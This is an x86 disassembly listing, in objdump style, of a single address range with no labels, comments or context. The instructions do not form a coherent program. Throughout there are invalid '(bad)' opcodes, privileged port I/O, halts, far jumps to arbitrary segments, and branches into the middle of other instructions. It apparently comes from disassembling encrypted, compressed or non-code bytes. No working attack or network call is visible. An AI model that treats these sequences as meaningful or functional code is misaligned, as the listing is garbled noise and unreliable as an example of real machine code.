  41c0bc:	icebp  
  41c0bd:	mov    dh,BYTE PTR [edi+0x4ced78c1]
  41c0c3:	inc    edx
  41c0c4:	inc    edx
  41c0c5:	sbb    BYTE PTR [edx+edx*8+0x56],ch
  41c0c9:	stc    
  41c0ca:	xchg   BYTE PTR [ebx+ecx*4-0x31e25e7d],al
  41c0d1:	mov    bl,0x8e
  41c0d3:	and    dh,BYTE PTR [ebx]
  41c0d5:	cmp    esi,DWORD PTR [esi+edx*4-0x21]
  41c0d9:	mov    ds,WORD PTR [ecx+0x4371e42e]
  41c0df:	mov    al,0x5c
  41c0e1:	mov    ds:0x46246c02,eax
  41c0e6:	jb     0x41c15e
  41c0e8:	rep stos BYTE PTR es:[edi],al
  41c0ea:	mov    eax,ds:0xb43d98e8
  41c0ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0f0:	je     0x41c0fd
  41c0f2:	arpl   WORD PTR [ebx-0x22ea7bf4],sp
  41c0f8:	fdivr  st,st(1)
  41c0fa:	out    dx,al
  41c0fb:	mov    edx,DWORD PTR ds:0xd2aef617
  41c101:	mov    bh,0x96
  41c103:	outs   dx,DWORD PTR ds:[esi]
  41c104:	pusha  
  41c105:	adc    eax,0x6eeedb53
  41c10a:	inc    ebp
  41c10b:	in     eax,0x75
  41c10d:	mov    al,ds:0x4158cf38
  41c112:	sbb    BYTE PTR [ebp+0x10],0x9b
  41c116:	fadd   DWORD PTR [eax]
  41c118:	loopne 0x41c11a
  41c11a:	and    DWORD PTR [ebx],esp
  41c11c:	push   0x8f7fb692
  41c121:	xor    eax,0x2db7d68e
  41c126:	sub    al,0xd6
  41c128:	sti    
  41c129:	cld    
  41c12a:	sub    eax,0x7839dc7e
  41c12f:	jbe    0x41c185
  41c131:	test   BYTE PTR [esi-0x50],cl
  41c134:	add    eax,0xffa5a03f
  41c139:	ret    
  41c13a:	inc    edx
  41c13b:	outs   dx,BYTE PTR ds:[esi]
  41c13c:	hlt    
  41c13d:	iret   
  41c13e:	ja     0x41c0db
  41c140:	clc    
  41c141:	mov    ebx,DWORD PTR [esi-0x4f4488e3]
  41c147:	inc    edi
  41c148:	jnp    0x41c1be
  41c14a:	cmp    al,0xd1
  41c14c:	pop    ebp
  41c14d:	aaa    
  41c14e:	dec    esp
  41c14f:	mov    BYTE PTR [edx+edi*1+0x21fcdf9d],ch
  41c156:	push   0xffffff9e
  41c158:	ins    BYTE PTR es:[edi],dx
  41c159:	jnp    0x41c0df
  41c15b:	dec    esp
  41c15c:	xchg   dl,dh
  41c15e:	lds    eax,FWORD PTR [ebx+ecx*8+0x6a]
  41c162:	jae    0x41c178
  41c164:	and    DWORD PTR [ebp-0x30],ecx
  41c167:	xchg   edx,eax
  41c168:	paddusb mm1,QWORD PTR [esi-0x2c4dcaba]
  41c16f:	div    edi
  41c171:	jno    0x41c1b6
  41c173:	xchg   edx,eax
  41c174:	lock mov ?,WORD PTR [esi+0x5f]
  41c178:	je     0x41c0fb
  41c17a:	mov    cl,0xd7
  41c17c:	imul   WORD PTR [ebx]
  41c17f:	push   esi
  41c180:	fistp  DWORD PTR [edx+eax*8-0x5fd0a868]
  41c187:	jo     0x41c1ea
  41c189:	and    eax,0x91430468
  41c18e:	sbb    DWORD PTR [edi+0x21aba1a5],0xffffff91
  41c195:	inc    esp
  41c196:	out    0x10,eax
  41c198:	mov    eax,0x8a02dafb
  41c19d:	loopne 0x41c137
  41c19f:	sub    BYTE PTR [ebp+0x5d338bfb],0xa5
  41c1a6:	stos   BYTE PTR es:[edi],al
  41c1a7:	adc    ah,ah
  41c1a9:	nop
  41c1aa:	int    0xd4
  41c1ac:	xlat   BYTE PTR ds:[ebx]
  41c1ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1ae:	je     0x41c14a
  41c1b0:	dec    ebp
  41c1b1:	repz loopne 0x41c204
  41c1b4:	cdq    
  41c1b5:	pop    ds
  41c1b6:	fld    DWORD PTR [edi+0x3f]
  41c1b9:	out    dx,eax
  41c1ba:	push   edi
  41c1bb:	mov    edx,0x81af856
  41c1c0:	mov    ds:0x720ed336,al
  41c1c5:	std    
  41c1c6:	lahf   
  41c1c7:	jecxz  0x41c233
  41c1c9:	inc    esp
  41c1ca:	mov    al,ds:0xfab32fa6
  41c1cf:	add    BYTE PTR [esi],bh
  41c1d1:	jle    0x41c232
  41c1d3:	and    DWORD PTR [ecx-0x6406fcf0],esi
  41c1d9:	jns    0x41c1ba
  41c1db:	cmp    al,0xa8
  41c1dd:	pop    edx
  41c1de:	loopne 0x41c253
  41c1e0:	push   eax
  41c1e1:	pusha  
  41c1e2:	xchg   esi,eax
  41c1e3:	sub    BYTE PTR [edi+0x3e],dh
  41c1e6:	in     al,dx
  41c1e7:	shr    cl,cl
  41c1e9:	(bad)  
  41c1ea:	and    dh,dh
  41c1ec:	aad    0x53
  41c1ee:	push   esp
  41c1ef:	mov    bh,0x1e
  41c1f1:	mov    edi,esi
  41c1f3:	dec    ebp
  41c1f4:	(bad)  
  41c1f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1f6:	psadbw mm3,QWORD PTR [ebp+0x3b379e3e]
  41c1fd:	fisttp WORD PTR [esi-0x79]
  41c200:	hlt    
  41c201:	jmp    0xec1f:0x6c78674d
  41c208:	fsub   DWORD PTR [ebx+ebx*8+0x57]
  41c20c:	stc    
  41c20d:	scas   eax,DWORD PTR es:[edi]
  41c20e:	jmp    0x2b86:0x36e1859
  41c215:	and    ch,BYTE PTR [edi+0x55]
  41c218:	adc    dl,0xe8
  41c21b:	cmp    esi,DWORD PTR [ecx+0x41]
  41c21e:	adc    BYTE PTR [edi],dl
  41c220:	aad    0xcc
  41c222:	enter  0x3274,0x10
  41c226:	gs dec esi
  41c228:	sub    dh,bh
  41c22a:	jmp    0xb25ff52f
  41c22f:	mov    dh,0xd7
  41c231:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c232:	cs and eax,0xf1ab5e50
  41c238:	sti    
  41c239:	mov    dl,0xdb
  41c23b:	dec    edx
  41c23c:	(bad)  
  41c23d:	xchg   esp,eax
  41c23e:	jb     0x41c288
  41c240:	xor    DWORD PTR [eax],esp
  41c242:	sub    DWORD PTR [edi-0x16c8d103],esi
  41c248:	sbb    dl,BYTE PTR [ebx]
  41c24a:	out    0x9a,eax
  41c24c:	addr16 mov bh,0x83
  41c24f:	sub    bh,BYTE PTR [edx-0x20]
  41c252:	xor    DWORD PTR [ebx-0x75],0xffffffe3
  41c256:	jecxz  0x41c28c
  41c258:	xchg   ecx,eax
  41c259:	xchg   ebp,eax
  41c25a:	xor    eax,ecx
  41c25c:	sbb    esi,DWORD PTR [esi]
  41c25e:	into   
  41c25f:	mov    ds:0x182bd981,eax
  41c264:	cmc    
  41c265:	xlat   BYTE PTR ds:[ebx]
  41c266:	mov    BYTE PTR [ecx],cl
  41c268:	adc    edi,DWORD PTR [esi-0x2c14e61a]
  41c26e:	les    esp,FWORD PTR [ebx+0x5f]
  41c271:	cld    
  41c272:	in     eax,dx
  41c273:	push   edi
  41c274:	hlt    
  41c275:	xor    ebp,DWORD PTR [esi]
  41c277:	sub    BYTE PTR [edi+ebp*1],cl
  41c27a:	or     ch,BYTE PTR [edx+eax*4]
  41c27d:	test   eax,0x463ec5c1
  41c282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c283:	daa    
  41c284:	fs cmp al,0x98
  41c287:	mov    bh,dh
  41c289:	test   eax,0xe15e4ee4
  41c28e:	cld    
  41c28f:	xchg   edi,eax
  41c290:	pushf  
  41c291:	stc    
  41c292:	push   ebp
  41c293:	das    
  41c294:	out    dx,al
  41c295:	fmul   QWORD PTR [ebp+eiz*2+0x15]
  41c299:	mov    BYTE PTR [ecx+0x32],ah
  41c29c:	jg     0x41c2d1
  41c29e:	jmp    0x41c2f4
  41c2a0:	lds    ecx,FWORD PTR [esi]
  41c2a2:	or     DWORD PTR [eax+ecx*4-0x3e7401cc],edx
  41c2a9:	mov    esi,0x459388f7
  41c2ae:	mov    edx,0x9fc81387
  41c2b3:	cmp    BYTE PTR [esi],al
  41c2b5:	js     0x41c281
  41c2b7:	push   ecx
  41c2b8:	pop    edx
  41c2b9:	sbb    eax,0x1c67ec0e
  41c2be:	daa    
  41c2bf:	das    
  41c2c0:	mov    cs,WORD PTR [edi]
  41c2c2:	xchg   edx,eax
  41c2c3:	add    BYTE PTR [ebx+0x60],bl
  41c2c6:	in     al,dx
  41c2c7:	jle    0x41c348
  41c2c9:	leave  
  41c2ca:	mov    ebx,0xf42af4a4
  41c2cf:	fsub   DWORD PTR [esi+0x3a]
  41c2d2:	clc    
  41c2d3:	adc    edx,edx
  41c2d5:	xor    al,dh
  41c2d7:	mov    ebp,0xce4b8a87
  41c2dc:	test   DWORD PTR [edi],0x4f5a7763
  41c2e2:	xor    esi,ebx
  41c2e4:	sti    
  41c2e5:	add    DWORD PTR [ebx-0x35c2fa69],0xb67cdbe
  41c2ef:	ins    DWORD PTR es:[edi],dx
  41c2f0:	xchg   edi,eax
  41c2f1:	pop    ecx
  41c2f2:	ret    
  41c2f3:	dec    edi
  41c2f4:	mov    dl,dh
  41c2f6:	arpl   WORD PTR [esi+0x6d],cx
  41c2f9:	and    eax,0x34373c69
  41c2fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2ff:	push   ds
  41c300:	js     0x41c320
  41c302:	inc    esp
  41c303:	mov    esp,0xe5376315
  41c308:	out    dx,eax
  41c309:	fild   DWORD PTR [edx+ebx*1+0x7e2357f2]
  41c310:	loop   0x41c2ae
  41c312:	mov    al,0x12
  41c314:	pop    ds
  41c315:	test   BYTE PTR [ebx+0x38],dh
  41c318:	das    
  41c319:	push   ebp
  41c31a:	push   esp
  41c31b:	in     eax,0xcc
  41c31d:	inc    eax
  41c31e:	fist   WORD PTR [edx+0x4901a428]
  41c324:	sti    
  41c325:	ror    ah,1
  41c327:	shr    dl,1
  41c329:	test   al,0x76
  41c32b:	add    al,0x8f
  41c32d:	sbb    ebx,0xb
  41c330:	pop    ss
  41c331:	mov    ebp,DWORD PTR [esi+0x4a6faa08]
  41c337:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c338:	and    ebp,DWORD PTR [ecx]
  41c33a:	and    BYTE PTR [edx+0x2b],dl
  41c33d:	sbb    eax,0x3b1ae371
  41c342:	data16 mov bh,0x27
  41c345:	jo     0x41c2e2
  41c347:	imul   DWORD PTR [ecx-0x181591d2]
  41c34d:	sub    eax,0xc88c76ad
  41c352:	sti    
  41c353:	int    0x6
  41c355:	js     0x41c3ac
  41c357:	in     al,dx
  41c358:	cdq    
  41c359:	dec    esi
  41c35a:	(bad)  
  41c35b:	fnsave [esi+0x77]
  41c35e:	aam    0x9f
  41c360:	mov    esi,0xe09f7d42
  41c365:	loope  0x41c352
  41c367:	or     dh,BYTE PTR [edx+eax*8+0x39]
  41c36b:	retf   0x7fed
  41c36e:	adc    eax,0x1aa09089
  41c373:	lods   eax,DWORD PTR ds:[esi]
  41c374:	nop
  41c375:	rol    DWORD PTR [edi-0x671eabcc],cl
  41c37b:	xchg   esp,eax
  41c37c:	add    eax,0x4b442044
  41c381:	jae    0x41c345
  41c383:	sub    ebx,DWORD PTR [ebx-0x3]
  41c386:	outs   dx,BYTE PTR ds:[esi]
  41c387:	ss gs pop esi
  41c38a:	push   edi
  41c38b:	push   ebp
  41c38c:	pop    esp
  41c38d:	shr    dl,0xd1
  41c390:	adc    ebx,DWORD PTR [ecx+0x6e573b7d]
  41c396:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c397:	rcr    DWORD PTR [esi+0x5b063a1a],1
  41c39d:	push   eax
  41c39e:	sub    ebp,DWORD PTR [edi]
  41c3a0:	and    DWORD PTR [eax],esi
  41c3a2:	sbb    edx,esp
  41c3a4:	es sbb eax,0x5531f7fd
  41c3aa:	inc    esp
  41c3ab:	inc    ebp
  41c3ac:	jne    0x41c35f
  41c3ae:	sbb    al,0xe0
  41c3b0:	ins    DWORD PTR es:[edi],dx
  41c3b1:	or     DWORD PTR [esi+0x7cf721b2],0x898228b4
  41c3bb:	fst    QWORD PTR [edx-0x43ffcb8]
  41c3c1:	mov    eax,ds:0xda7ecf63
  41c3c6:	cmp    al,0x75
  41c3c8:	xchg   DWORD PTR [edi+edi*4+0x49],edi
  41c3cc:	push   cs
  41c3cd:	scas   eax,DWORD PTR es:[edi]
  41c3ce:	sar    esi,cl
  41c3d0:	lock pop edi
  41c3d2:	mov    dl,0xe9
  41c3d4:	and    DWORD PTR [edi+0x3],ebp
  41c3d7:	jg     0x41c364
  41c3d9:	fcmovu st,st(5)
  41c3db:	sbb    eax,0xdc9efdd
  41c3e0:	rol    edx,1
  41c3e2:	jae    0x41c3f1
  41c3e4:	sti    
  41c3e5:	pop    ebx
  41c3e6:	xor    ebx,DWORD PTR [edi+0x7fc7f917]
  41c3ec:	das    
  41c3ed:	daa    
  41c3ee:	xchg   edi,eax
  41c3ef:	sub    BYTE PTR [ebx+0x5083a8a1],ah
  41c3f5:	cli    
  41c3f6:	imul   ecx,DWORD PTR [ecx-0x49],0x2d2e8aa9
  41c3fd:	xor    BYTE PTR [ebp+0x2e4bd0c2],0xb3
  41c404:	or     al,0x11
  41c406:	rcr    DWORD PTR [eax+ebp*1+0x66],0xfe
  41c40b:	pop    edx
  41c40c:	lods   eax,DWORD PTR ds:[esi]
  41c40d:	ficom  WORD PTR [ebp+0x7904e032]
  41c413:	mov    ebp,0x5c247e20
  41c418:	outs   dx,DWORD PTR ds:[esi]
  41c419:	add    BYTE PTR [eax+esi*1+0x3c],ch
  41c41d:	mov    esi,0x961b1f0c
  41c422:	inc    ebx
  41c423:	xor    eax,0xc914b9f4
  41c428:	mov    edx,0x606bb54
  41c42d:	mov    dh,BYTE PTR [ebx-0x62]
  41c430:	loope  0x41c3ca
  41c432:	mov    ds:0xe593d7b2,eax
  41c437:	cs sbb eax,0xd2cf55b4
  41c43d:	(bad)  
  41c43e:	xor    BYTE PTR gs:[eax],dl
  41c441:	outs   dx,BYTE PTR ds:[esi]
  41c442:	and    DWORD PTR [eax],esp
  41c444:	clc    
  41c445:	mov    esi,DWORD PTR [esi-0x305bd9fa]
  41c44b:	mov    edx,0x52aef9e8
  41c450:	xlat   BYTE PTR ds:[ebx]
  41c451:	bound  esi,QWORD PTR [esi-0xa]
  41c454:	ss jnp 0x41c413
  41c457:	mov    esp,0xaf5093d7
  41c45c:	mov    ecx,0x148da951
  41c461:	pop    edx
  41c462:	cmp    al,0xa9
  41c464:	add    BYTE PTR [esi],ch
  41c466:	push   cs
  41c467:	xor    dh,al
  41c469:	jmp    0x283b:0x6cf205f2
  41c470:	inc    eax
  41c471:	push   cs
  41c472:	dec    edi
  41c473:	ss cwde 
  41c475:	not    BYTE PTR [eax-0x10]
  41c478:	xor    BYTE PTR [ebx-0x5d7d72b7],al
  41c47e:	xchg   esp,eax
  41c47f:	add    dh,BYTE PTR es:[esi+0x336e4e23]
  41c486:	dec    ebp
  41c487:	ret    
  41c488:	push   ebx
  41c489:	out    dx,eax
  41c48a:	sbb    DWORD PTR [ecx+0x4d],esi
  41c48d:	cli    
  41c48e:	jmp    0x5196f6d7
  41c493:	and    edi,edx
  41c495:	cdq    
  41c496:	add    BYTE PTR ds:0x20e5,dh
  41c49b:	xor    edi,DWORD PTR [ebp-0x5c]
  41c49e:	fisttp WORD PTR [ebp+0x369994cd]
  41c4a4:	mov    esp,0xf16e9c35
  41c4a9:	jp     0x41c50b
  41c4ab:	adc    al,0x6a
  41c4ad:	or     esi,DWORD PTR [esi]
  41c4af:	mov    ecx,0xa4fc3114
  41c4b4:	por    mm3,QWORD PTR [ecx+edi*8]
  41c4b8:	icebp  
  41c4b9:	inc    edi
  41c4ba:	and    BYTE PTR [ebx+0x6f],dl
  41c4bd:	jns    0x41c486
  41c4bf:	sub    eax,0xc532f4f4
  41c4c4:	mov    ecx,0xbd9fd519
  41c4c9:	test   BYTE PTR [eax],bh
  41c4cb:	dec    ecx
  41c4cc:	ins    DWORD PTR es:[edi],dx
  41c4cd:	cld    
  41c4ce:	ror    DWORD PTR [ecx-0x68b2e931],1
  41c4d4:	aad    0xd1
  41c4d6:	out    0x1c,eax
  41c4d8:	fmul   st,st(0)
  41c4da:	xor    ebx,DWORD PTR [ebx+0x71481997]
  41c4e0:	cld    
  41c4e1:	jg     0x41c55f
  41c4e3:	jbe    0x41c4bd
  41c4e5:	push   ebx
  41c4e6:	adc    bh,al
  41c4e8:	pop    ebx
  41c4e9:	inc    ebx
  41c4ea:	push   cs
  41c4eb:	test   eax,0xfb10998a
  41c4f0:	mov    edx,0x75f0b6ea
  41c4f5:	inc    ecx
  41c4f6:	mov    ds:0x90ff1013,eax
  41c4fb:	xchg   esp,eax
  41c4fc:	into   
  41c4fd:	repz xchg ebp,eax
  41c4ff:	ret    0xc02f
  41c502:	adc    al,0xeb
  41c504:	or     edi,ebp
  41c506:	add    eax,0x63a4c52d
  41c50b:	inc    ecx
  41c50c:	mov    esp,0xb79c6e1
  41c511:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c512:	mov    cl,0xf6
  41c514:	iret   
  41c515:	push   cs
  41c516:	call   0xa4782875
  41c51b:	mov    ebx,0xd41ccb07
  41c520:	and    eax,0x29938198
  41c525:	jne    0x41c574
  41c527:	add    dh,ch
  41c529:	test   al,dl
  41c52b:	mov    edx,ecx
  41c52d:	ins    BYTE PTR es:[edi],dx
  41c52e:	inc    ebp
  41c52f:	popa   
  41c530:	mov    esi,0x7ba24e1e
  41c535:	cmc    
  41c536:	sub    DWORD PTR [ebx+edx*2],edx
  41c539:	or     DWORD PTR [edx+ebx*8],ebx
  41c53c:	xlat   BYTE PTR ds:[ebx]
  41c53d:	fsub   DWORD PTR [eax+0x3f]
  41c540:	pop    esp
  41c541:	fcom   QWORD PTR [ebp-0x61]
  41c544:	jp     0x41c571
  41c546:	mov    cl,bl
  41c548:	xchg   ebp,eax
  41c549:	pop    edi
  41c54a:	xchg   ebx,eax
  41c54b:	imul   edi,DWORD PTR [ebx+ebx*8],0xa9d1ffff
  41c552:	adc    eax,0xf39474c1
  41c557:	xchg   ebx,eax
  41c558:	fcomp  DWORD PTR [edx]
  41c55a:	add    DWORD PTR [ebp-0x36],ecx
  41c55d:	mov    al,ds:0x3d24e246
  41c562:	loopne 0x41c5cb
  41c564:	bound  edi,QWORD PTR [esi+0x3b]
  41c567:	cmp    ebx,eax
  41c569:	pop    eax
  41c56a:	stos   DWORD PTR es:[edi],eax
  41c56b:	cmc    
  41c56c:	mov    dh,0x17
  41c56e:	lahf   
  41c56f:	dec    edi
  41c570:	or     BYTE PTR [eax-0x7aa9318a],bl
  41c576:	jmp    0xc665:0xb80ef54f
  41c57d:	and    al,0xa
  41c57f:	sahf   
  41c580:	xor    eax,edx
  41c582:	div    BYTE PTR gs:[edi+0x43]
  41c586:	gs pop ds
  41c588:	push   0x6d
  41c58a:	sub    BYTE PTR [ecx],dl
  41c58c:	popf   
  41c58d:	xchg   ebp,eax
  41c58e:	sbb    bl,BYTE PTR [ecx-0x46]
  41c591:	out    dx,al
  41c592:	stc    
  41c593:	mov    BYTE PTR [ecx-0x58],dl
  41c596:	leave  
  41c597:	lods   al,BYTE PTR ds:[esi]
  41c598:	ss adc eax,0x5a3ce28
  41c59e:	pavgb  mm1,QWORD PTR [esi+ebp*4+0x5f]
  41c5a3:	hlt    
  41c5a4:	mov    ch,0x16
  41c5a6:	jl     0x41c585
  41c5a8:	pop    eax
  41c5a9:	pop    ss
  41c5aa:	data16 or BYTE PTR [edi+0x363d83dc],al
  41c5b1:	ret    
  41c5b2:	stos   DWORD PTR es:[edi],eax
  41c5b3:	out    dx,eax
  41c5b4:	or     BYTE PTR [edi],ah
  41c5b6:	ss xchg edx,eax
  41c5b8:	dec    edx
  41c5b9:	fidiv  DWORD PTR [edi]
  41c5bb:	mov    eax,ds:0xf332b880
  41c5c0:	and    DWORD PTR [eax+0x6a366074],edx
  41c5c6:	clc    
  41c5c7:	adc    eax,0x355ebb1d
  41c5cc:	jge    0x41c57d
  41c5ce:	(bad)  
  41c5cf:	daa    
  41c5d0:	xor    BYTE PTR [edi-0x1a485720],ch
  41c5d6:	stos   DWORD PTR es:[edi],eax
  41c5d7:	loopne 0x41c566
  41c5d9:	dec    ebp
  41c5da:	je     0x41c566
  41c5dc:	aam    0x1c
  41c5de:	sub    DWORD PTR [ebp+0x54ee5505],ebp
  41c5e4:	lea    edx,[edx+0x21]
  41c5e7:	lahf   
  41c5e8:	les    ebx,FWORD PTR [edi-0x9]
  41c5eb:	mov    DWORD PTR [esi+eax*4+0x3a838519],edi
  41c5f2:	and    eax,0xc84880f9
  41c5f7:	addr16 ds pop ss
  41c5fa:	daa    
  41c5fb:	dec    ebp
  41c5fc:	jmp    0x41c61a
  41c5fe:	cmp    al,0x70
  41c600:	loop   0x41c64f
  41c602:	jae    0x41c64e
  41c604:	out    dx,eax
  41c605:	push   eax
  41c606:	fldenv cs:[edi-0x80]
  41c60a:	das    
  41c60b:	pusha  
  41c60c:	lahf   
  41c60d:	aas    
  41c60e:	or     al,0x95
  41c610:	(bad)  
  41c611:	mov    edi,0x80c48bc6
  41c616:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c617:	push   0xb1b91511
  41c61c:	add    ebx,edx
  41c61e:	aad    0x42
  41c620:	out    0xe6,eax
  41c622:	test   eax,0xca1038fb
  41c627:	loopne 0x41c699
  41c629:	or     ebx,edx
  41c62b:	sub    esp,DWORD PTR [esi-0x36bb50de]
  41c631:	dec    edx
  41c632:	scas   al,BYTE PTR es:[edi]
  41c633:	inc    eax
  41c634:	or     edi,DWORD PTR [edi-0x30f9ab91]
  41c63a:	outs   dx,DWORD PTR ds:[esi]
  41c63b:	ret    0x5c8c
  41c63e:	sti    
  41c63f:	sub    al,0xff
  41c641:	ss icebp 
  41c643:	sub    al,0x37
  41c645:	jmp    0x41c657
  41c647:	jmp    0x5323763e
  41c64c:	je     0x41c6c0
  41c64e:	sar    BYTE PTR [edi],cl
  41c650:	inc    esp
  41c651:	sub    BYTE PTR ds:0x42156e8e,ch
  41c657:	lds    eax,FWORD PTR [edx-0x2587049c]
  41c65d:	inc    eax
  41c65e:	pop    es
  41c65f:	push   es
  41c660:	jmp    0x41c692
  41c662:	mov    edx,0x6af2f53
  41c667:	daa    
  41c668:	ds mov ah,0x8
  41c66b:	jp     0x41c622
  41c66d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c66e:	idiv   BYTE PTR [ecx-0x5d7934e8]
  41c674:	and    al,0x3d
  41c676:	cwde   
  41c677:	les    edx,FWORD PTR [eax+0x25bab552]
  41c67d:	popa   
  41c67e:	adc    cl,bh
  41c680:	mov    ebp,0x78872390
  41c685:	and    ah,dl
  41c687:	push   edi
  41c688:	popa   
  41c689:	inc    ebx
  41c68a:	add    al,0xc9
  41c68c:	mov    WORD PTR [edi+ebx*4],?
  41c68f:	xor    ecx,DWORD PTR [eax+0x71]
  41c692:	or     al,0xf8
  41c694:	jecxz  0x41c650
  41c696:	mov    bh,0xdb
  41c698:	stc    
  41c699:	dec    ebp
  41c69a:	lods   eax,DWORD PTR ds:[esi]
  41c69b:	lods   al,BYTE PTR ds:[esi]
  41c69c:	call   0x9a0a:0xee0f3cd
  41c6a3:	popf   
  41c6a4:	popf   
  41c6a5:	push   ds
  41c6a6:	in     al,0x4b
  41c6a8:	nop
  41c6a9:	not    DWORD PTR [ecx+0x36d7635e]
  41c6af:	push   0xffffffba
  41c6b1:	sub    BYTE PTR [ebp-0x38ed16b3],0x51
  41c6b8:	cld    
  41c6b9:	fs mov ebx,0x4c127a65
  41c6bf:	cld    
  41c6c0:	aad    0xeb
  41c6c2:	ds sahf 
  41c6c4:	mov    ecx,0xa7e8aaea
  41c6c9:	fmul   QWORD PTR [eax+0x29e9ce04]
  41c6cf:	adc    al,0x27
  41c6d1:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41c6d3:	fist   DWORD PTR es:[eax]
  41c6d6:	inc    ecx
  41c6d7:	sbb    cl,bl
  41c6d9:	push   edx
  41c6da:	inc    ebx
  41c6db:	std    
  41c6dc:	jg     0x41c72e
  41c6de:	mov    eax,0xd2583243
  41c6e3:	sub    al,0x64
  41c6e5:	dec    esp
  41c6e6:	add    bh,BYTE PTR [edx+0x49]
  41c6e9:	push   eax
  41c6ea:	pmulhw mm7,QWORD PTR [ebp-0x5e]
  41c6ee:	xchg   DWORD PTR [ecx-0x48],ebp
  41c6f1:	test   DWORD PTR [esi*4+0x13556fb4],0x9bd6f0df
  41c6fc:	xor    dh,dh
  41c6fe:	and    DWORD PTR ss:[esi+0x6e],edi
  41c702:	jo     0x41c77a
  41c704:	fwait
  41c705:	neg    BYTE PTR [edx+0x328d5ea8]
  41c70b:	add    dh,ah
  41c70d:	cmp    bh,0x63
  41c710:	inc    ebx
  41c711:	retf   
  41c712:	repnz mov esi,0x4d4a71f7
  41c718:	imul   ebp,DWORD PTR [ebp-0x6b3be26e],0xffffff98
  41c71f:	shr    BYTE PTR [eax],0x60
  41c722:	sub    bl,BYTE PTR [esi]
  41c724:	imul   ebp,ecx,0x545abe89
  41c72a:	inc    esi
  41c72b:	adc    al,dh
  41c72d:	xor    edx,DWORD PTR [esi-0x354d989d]
  41c733:	push   ebx
  41c734:	test   ebp,ebp
  41c736:	cmc    
  41c737:	mov    al,0x92
  41c739:	xchg   ecx,eax
  41c73a:	sbb    BYTE PTR [ebx],dh
  41c73c:	jb     0x41c720
  41c73e:	div    DWORD PTR [ebx]
  41c740:	inc    edx
  41c741:	or     eax,0x90b8c1aa
  41c746:	or     al,0x35
  41c748:	dec    eax
  41c749:	jg     0x41c70c
  41c74b:	xchg   ebp,eax
  41c74c:	push   edi
  41c74d:	test   eax,0xb6d40e3d
  41c752:	or     dl,al
  41c754:	adc    DWORD PTR [ecx+0x44],esp
  41c757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c758:	mov    bh,0x8b
  41c75a:	sub    cl,BYTE PTR [eax-0x652aff13]
  41c760:	mov    bh,0x67
  41c762:	or     al,0x5c
  41c764:	pop    es
  41c765:	adc    al,0xd7
  41c767:	inc    di
  41c769:	jmp    0x41c6f9
  41c76b:	jnp    0x41c7ca
  41c76d:	jnp    0x41c7d5
  41c76f:	push   ds
  41c770:	jp     0x41c6f3
  41c772:	leave  
  41c773:	es mov ah,0x90
  41c776:	aam    0x79
  41c778:	push   eax
  41c779:	or     eax,0x6f80cefa
  41c77e:	retf   
  41c77f:	mov    ebx,0xa9e90d34
  41c784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c785:	shl    BYTE PTR [esi-0x3d5095b5],1
  41c78b:	mov    bh,0xfc
  41c78d:	push   0xffffffd1
  41c78f:	inc    edi
  41c790:	jno    0x41c71a
  41c792:	adc    ah,BYTE PTR [esi]
  41c794:	sub    bh,BYTE PTR [edx+esi*4+0x6aaed28e]
  41c79b:	or     BYTE PTR [ebx],bl
  41c79d:	ins    DWORD PTR es:[edi],dx
  41c79e:	add    al,0xad
  41c7a0:	push   cs
  41c7a1:	fisttp DWORD PTR [edx]
  41c7a3:	pop    esp
  41c7a4:	nop
  41c7a5:	fucomi st,st(1)
  41c7a7:	pusha  
  41c7a8:	in     eax,0x5e
  41c7aa:	xchg   BYTE PTR [ebx-0x7f],al
  41c7ad:	xchg   ecx,eax
  41c7ae:	adc    al,al
  41c7b0:	(bad)  
  41c7b1:	xchg   esp,eax
  41c7b2:	test   BYTE PTR [eax-0x24],ah
  41c7b5:	inc    edx
  41c7b6:	jg     0x41c7ab
  41c7b8:	or     edx,ebp
  41c7ba:	add    esi,0xb7f3300e
  41c7c0:	(bad)  
  41c7c1:	scas   al,BYTE PTR es:[edi]
  41c7c2:	mov    BYTE PTR [ebp+eiz*8+0xd],al
  41c7c6:	and    eax,0xc1ebf3dd
  41c7cb:	adc    eax,0x2da6941e
  41c7d0:	push   esi
  41c7d1:	mov    DWORD PTR [edx-0x51],esi
  41c7d4:	pop    ebx
  41c7d5:	sti    
  41c7d6:	daa    
  41c7d7:	in     al,dx
  41c7d8:	xchg   edx,eax
  41c7d9:	xor    DWORD PTR [ebx+0x1c930d3a],ebp
  41c7df:	mov    ch,0x17
  41c7e1:	aam    0xe6
  41c7e3:	inc    eax
  41c7e4:	adc    al,0xc1
  41c7e6:	popf   
  41c7e7:	mov    cl,0x77
  41c7e9:	or     ebp,ebx
  41c7eb:	(bad)  
  41c7ed:	bound  esi,QWORD PTR [esi-0x3c104b55]
  41c7f3:	mov    ch,0x2a
  41c7f5:	and    eax,0xe95ece9f
  41c7fa:	sub    eax,0x192d0f0d
  41c7ff:	dec    esp
  41c800:	and    bl,BYTE PTR [esi]
  41c802:	add    dl,BYTE PTR [ebp+0x29]
  41c805:	in     eax,dx
  41c806:	xor    ebx,DWORD PTR [esi-0x5865293]
  41c80c:	push   ebx
  41c80d:	adc    BYTE PTR [ecx],ah
  41c80f:	cmp    edx,0xffffff8b
  41c812:	ins    BYTE PTR es:[edi],dx
  41c813:	xlat   BYTE PTR ds:[ebx]
  41c814:	sbb    eax,0xc33e58be
  41c819:	outs   dx,BYTE PTR ds:[esi]
  41c81a:	pusha  
  41c81b:	xchg   BYTE PTR [eax+0x4f],bh
  41c81e:	push   es
  41c81f:	imul   ebp,DWORD PTR [edx+eax*4+0x76],0xfffffffe
  41c824:	add    bl,0x68
  41c827:	(bad)  
  41c828:	jl     0x41c848
  41c82a:	cmp    al,ah
  41c82c:	ins    DWORD PTR es:[edi],dx
